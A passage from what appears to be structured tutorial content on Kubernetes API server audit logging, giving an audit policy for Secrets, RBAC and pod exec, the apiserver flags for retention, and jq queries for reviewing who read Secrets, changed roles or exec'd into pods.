              "apiVersion: audit.k8s.io/v1\nkind: Policy\nomitStages: [RequestReceived]\nrules:\n- level: None\n  nonResourceURLs: [\"/healthz*\", \"/readyz*\", \"/livez*\", \"/metrics\", \"/version\"]\n- level: None\n  verbs: [watch]\n- level: None\n  users: [\"system:kube-proxy\"]\n  resources:\n  - group: \"\"\n    resources: [endpoints, services, endpointslices]\n  ...\nThe first matching rule decides the level, so the None rules go at the top. omitStages RequestReceived removes the duplicate event per request that adds nothing to 'who did what'."
            ),
            part(
              "The three questions at the right levels",
              "Secrets: level Metadata for get/list (who read, without logging the Secret's contents) and RequestResponse or Request for create/update/patch/delete (what changed) -- never RequestResponse for reads, which would copy secret values into the log; RBAC: RequestResponse on roles/rolebindings/clusterroles/clusterrolebindings; exec: level Request (or Metadata) on pods/exec, pods/attach, pods/portforward subresources.",
              "- level: Metadata\n  verbs: [get, list]\n  resources:\n  - group: \"\"\n    resources: [secrets]\n- level: Request\n  verbs: [create, update, patch, delete]\n  resources:\n  - group: \"\"\n    resources: [secrets]\n- level: RequestResponse\n  resources:\n  - group: rbac.authorization.k8s.io\n    resources: [roles, rolebindings, clusterroles, clusterrolebindings]\n- level: Request\n  resources:\n  - group: \"\"\n    resources: [pods/exec, pods/attach, pods/portforward]\nReads of Secrets at Metadata record who, which Secret, when and the response code -- but not the value; logging the body of a Secret GET would turn the audit log into a Secret store. Writes at Request capture the object as submitted (the new value, which is sensitive -- restrict the log file accordingly) so a change can be reconstructed."
            ),
            part(
              "Catch-all and enabling it",
              "A final rule at level Metadata for everything else, so no request is unlogged; API server flags --audit-policy-file, --audit-log-path, --audit-log-maxage=90, --audit-log-maxbackup and --audit-log-maxsize, with hostPath mounts, and optionally --audit-webhook-config-file to ship off-node.",
              "- level: Metadata   # everything else: who did what, no bodies\nkube-apiserver flags:\n    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n    - --audit-log-path=/var/log/kubernetes/audit/audit.log\n    - --audit-log-maxage=90\n    - --audit-log-maxbackup=20\n    - --audit-log-maxsize=200\nwith hostPath volumes for the policy (File, readOnly) and the log directory (DirectoryOrCreate). maxage 90 meets the retention requirement; maxbackup and maxsize cap the disk. For tamper resistance and search, also ship the log off the node (--audit-webhook-config-file to a collector, or a log agent tailing the file) -- a log that lives only on the node is lost with the node."
            ),
            part(
              "Queries",
              "jq filters over the JSON lines: Secret reads/changes by objectRef.resource == \"secrets\" with user.username, verb, objectRef.namespace/name and requestReceivedTimestamp; RBAC changes by objectRef.apiGroup == \"rbac.authorization.k8s.io\" and a write verb; execs by objectRef.subresource == \"exec\".",
              "Who read or changed Secrets:\n  jq -r 'select(.objectRef.resource==\"secrets\") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.name, .responseStatus.code] | @tsv' /var/log/kubernetes/audit/audit.log\nWho changed RBAC:\n  jq -r 'select(.objectRef.apiGroup==\"rbac.authorization.k8s.io\" and (.verb|IN(\"create\",\"update\",\"patch\",\"delete\"))) | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.resource, .objectRef.name] | @tsv' audit.log\nWho exec'd into a Pod:\n  jq -r 'select(.objectRef.subresource==\"exec\") | [.requestReceivedTimestamp, .user.username, .objectRef.namespace, .objectRef.name, .sourceIPs[0]] | @tsv' audit.log\n.user.username shows the human or system:serviceaccount:<ns>:<name>; .impersonatedUser appears when someone used --as; .sourceIPs tells you where the call came from."
            ),
          ],
        },
      ],
    },
  ],
};
